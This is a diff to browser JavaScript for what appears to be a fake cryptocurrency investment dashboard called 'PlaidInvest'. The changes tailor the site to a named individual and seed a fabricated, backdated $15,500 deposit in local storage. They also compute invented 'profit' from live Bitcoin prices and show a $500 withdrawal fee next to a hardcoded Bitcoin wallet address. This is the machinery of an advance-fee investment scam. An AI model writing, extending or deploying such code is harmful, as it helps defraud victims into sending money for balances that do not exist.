@@ -1,7 +1,10 @@
 (function () {
-  var site = window.SITE || { name: "Investor", displayName: "Investor", balanceUsd: 15500, btcPrice: 0 };
+  var site = window.SITE || { name: "Jerry McMillan", displayName: "Jerry McMillan", balanceUsd: 15500, btcPrice: 0 };
   var defaultBalance = Number(site.balanceUsd);
   if (Number.isNaN(defaultBalance) || defaultBalance <= 0) defaultBalance = 15500;
+
+  var holdingsKey = "balanceBtcHoldings";
+  var bookKey = "balanceUsdBook";
 
   var balanceResetKey = "balanceResetV3";
   if (localStorage.getItem(balanceResetKey) !== "1") {
@@ -65,12 +68,76 @@
     localStorage.setItem(accountResetV6, "1");
   }
 
+  function formatTxAmountUsd(usd) {
+    return "+$" + Number(usd).toLocaleString(undefined, { maximumFractionDigits: 0 });
+  }
+
+  function hasInitialDepositRecord(txs, amount) {
+    return txs.some(function (tx) {
+      if (!tx || tx.type !== "Deposit") return false;
+      if (tx.id === "initial-deposit") return true;
+      var status = ((tx.status || "") + "").toLowerCase();
+      if (status !== "completed") return false;
+      return parseTxAmountEarly(tx) === amount;
+    });
+  }
+
+  function parseTxAmountEarly(tx) {
+    if (tx && tx.amountUsd != null) return Math.abs(Number(tx.amountUsd)) || 0;
+    var raw = String((tx && tx.amount) || "").replace(/[^0-9.\-]/g, "");
+    var n = parseFloat(raw);
+    return isNaN(n) ? 0 : Math.abs(n);
+  }
+
+  function ensureInitialDepositTransaction() {
+    try {
+      var seed = (window.SITE && SITE.initialDeposit) || {};
+      var amount = Number(seed.amountUsd) > 0 ? Number(seed.amountUsd) : defaultBalance;
+      var txs = JSON.parse(localStorage.getItem("transactions") || "[]");
+      if (!Array.isArray(txs)) txs = [];
+      if (hasInitialDepositRecord(txs, amount)) return false;
+
+      var openedAt = Number(seed.createdAt) > 0 ? Number(seed.createdAt) : Date.now() - 30 * 24 * 60 * 60 * 1000;
+      var openedDate = seed.date || new Date(openedAt).toLocaleDateString();
+      txs.push({
+        id: seed.id || "initial-deposit",
+        seed: true,
+        date: openedDate,
+        createdAt: openedAt,
+        completesAt: openedAt,
+        amountUsd: amount,
+        type: seed.type || "Deposit",
+        asset: seed.asset || "BTC",
+        amount: formatTxAmountUsd(amount),
+        status: seed.status || "Completed"
+      });
+      txs.sort(function (a, b) {
+        return (b.createdAt || 0) - (a.createdAt || 0);
+      });
+      localStorage.setItem("transactions", JSON.stringify(txs));
+      return true;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  function syncSiteState() {
+    var book = Number(localStorage.getItem(bookKey));
+    if (Number.isNaN(book) || book <= 0) {
+      localStorage.setItem(bookKey, String(defaultBalance));
+      localStorage.setItem("balanceUsd", String(defaultBalance));
+      localStorage.removeItem(holdingsKey);
+    } else if (!localStorage.getItem("balanceUsd")) {
+      localStorage.setItem("balanceUsd", String(book));
+    }
+    return ensureInitialDepositTransaction();
+  }
+
+  var initialDepositSeeded = syncSiteState();
+
   var stored = Number(localStorage.getItem("balanceUsd"));
   if (!Number.isNaN(stored) && stored > 0) site.balanceUsd = stored;
   else site.balanceUsd = defaultBalance;
-
-  var holdingsKey = "balanceBtcHoldings";
-  var bookKey = "balanceUsdBook";
 
   if (!localStorage.getItem(bookKey)) {
     localStorage.setItem(bookKey, String(site.balanceUsd || defaultBalance));
@@ -144,7 +211,7 @@
   if (window.BtcPrice) BtcPrice.start();
   renderBalances();
 
-  var displayName = site.displayName || site.name || "Investor";
+  var displayName = site.displayName || site.name || "Jerry McMillan";
   var platformName = site.platformName || "PlaidInvest";
 
   document.querySelectorAll("[data-logo-text]").forEach(function (el) {
@@ -208,6 +275,77 @@
   };
 
   window.getPortfolioUsd = getPortfolioUsd;
+
+  window.getWithdrawalFeeUsd = function () {
+    var fee = site.withdrawalFeeUsd;
+    return fee != null && !Number.isNaN(Number(fee)) ? Number(fee) : 500;
+  };
+
+  window.getTotalProfit = function () {
+    var portfolio = getPortfolioUsd();
+    var book = getBookUsd();
+    return Math.round((portfolio - book) * 100) / 100;
+  };
+
+  function formatMoney(n) {
+    return "$" + Number(n).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  }
+
+  window.renderDashboardStats = function () {
+    var txs = getTransactions();
+    var deposit = 0;
+    var withdraw = 0;
+
+    txs.forEach(function (tx) {
+      if (!tx) return;
+      var status = ((tx.status || "") + "").toLowerCase();
+      if (status !== "completed") return;
+      var amt = parseTxAmount(tx);
+      if (tx.type === "Deposit") deposit += amt;
+      else if (tx.type === "Withdrawal") withdraw += amt;
+    });
+
+    var available = getAvailableBalance();
+    var profit = getTotalProfit();
+
+    function set(id, value) {
+      var node = document.getElementById(id);
+      if (node) node.textContent = value;
+    }
+
+    set("dash-stat-profit", formatMoney(profit));
+    set("dash-stat-profit-desktop", formatMoney(profit));
+    set("dash-stat-bonus", formatMoney(0));
+    set("dash-stat-deposit", formatMoney(deposit));
+    set("dash-stat-withdraw", formatMoney(withdraw));
+
+    var availEl = document.getElementById("dash-available-amt");
+    if (availEl) availEl.textContent = formatMoney(available);
+  };
+
+  window.fillWalletFields = function () {
+    var wallet = site.platformWallet || "bc1qa348fll9sh34h8gxux8dwfu4ygmwpe7v4nmyz2";
+    var fee = getWithdrawalFeeUsd();
+    document.querySelectorAll("[data-platform-wallet]").forEach(function (el) {
+      el.textContent = wallet;
+    });
+    document.querySelectorAll("[data-withdrawal-fee]").forEach(function (el) {
+      el.textContent = formatMoney(fee);
+    });
+  };
+
+  fillWalletFields();
+  renderDashboardStats();
+  document.addEventListener("transactionsUpdated", renderDashboardStats);
+
+  if (window.BtcPrice) {
+    var prevStatsOnLive = BtcPrice.onLivePrice;
+    BtcPrice.onLivePrice = function (price, oldPrice) {
+      if (typeof prevStatsOnLive === "function") prevStatsOnLive(price, oldPrice);
+      renderBalances();
+      renderDashboardStats();
+    };
+  }
 
   function getPendingWithdrawalTotal() {
     return getTransactions().filter(function (tx) {
@@ -292,5 +430,9 @@
 
   window.processPendingTransactions = processPendingTransactions;
   processPendingTransactions();
+  if (initialDepositSeeded) {
+    renderDashboardStats();
+    document.dispatchEvent(new CustomEvent("transactionsUpdated"));
+  }
   setInterval(processPendingTransactions, 30000);
 })();
